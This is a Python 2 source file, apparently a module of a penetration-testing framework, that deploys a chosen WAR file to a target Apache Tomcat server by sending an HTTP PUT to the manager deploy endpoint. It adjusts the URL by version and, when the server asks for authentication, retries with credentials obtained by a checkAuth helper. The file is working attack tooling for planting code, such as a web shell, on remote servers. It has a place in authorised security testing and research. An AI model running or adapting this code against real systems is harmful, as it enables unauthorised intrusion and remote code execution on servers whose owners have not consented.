from src.platform.tomcat.interfaces import TINTERFACES
from src.platform.tomcat.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from requests import exceptions
from log import LOG
import utility

versions = ["4.0", "4.1", "5.5", "6.0", "7.0", "8.0"]
title = TINTERFACES.MAN
def deploy(fingerengine, fingerprint):
    """ Through Tomcat versions, remotely deploying hasnt changed much.
    Newer versions have a new URL and some quarks, but it's otherwise very
    stable and quite simple.  Tomcat cannot be asked to pull a file, and thus
    we just execute a PUT with the payload.  Simple and elegant.
    """

    war_file = fingerengine.options.deploy
    war_path = parse_war_path(war_file)
    version_path = "manager/deploy"

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    if fingerprint.version in ["7.0", "8.0"]:
        # starting with version 7.0, the remote deployment URL has changed
        version_path = "manager/text/deploy"

    url = "http://{0}:{1}/{2}?path=/{3}".format(fingerengine.options.ip,
                                                fingerprint.port,
                                                version_path,
                                                war_path)

    try:
        files = open(war_file, 'rb')
    except Exception, e:
        utility.Msg(e, LOG.ERROR)
        return

    response = utility.requests_put(url, data=files)
    if response.status_code == 401 or \
            (response.status_code == 405 and fingerprint.version == "8.0"):
            # Tomcat 8.0 405's if you PUT without auth
        utility.Msg("Host %s:%s requires auth, checking..." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            try:
                response = utility.requests_put(url,
                                            data=files,
                                            cookies=cookies[0],
                                            auth=cookies[1])
            except exceptions.Timeout:
                response.status_code = 200

        else:
            utility.Msg("Could not get auth for %s:%s" %
                           (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 200:
        utility.Msg("Deployed {0} to /{1}".format(war_file, war_path), LOG.SUCCESS)
    elif response.status_code == 403:
        utility.Msg("This account does not have permissions to remotely deploy.", LOG.ERROR)
    else:
        utility.Msg("Failed to deploy (HTTP %s)" % response.status_code, LOG.ERROR)
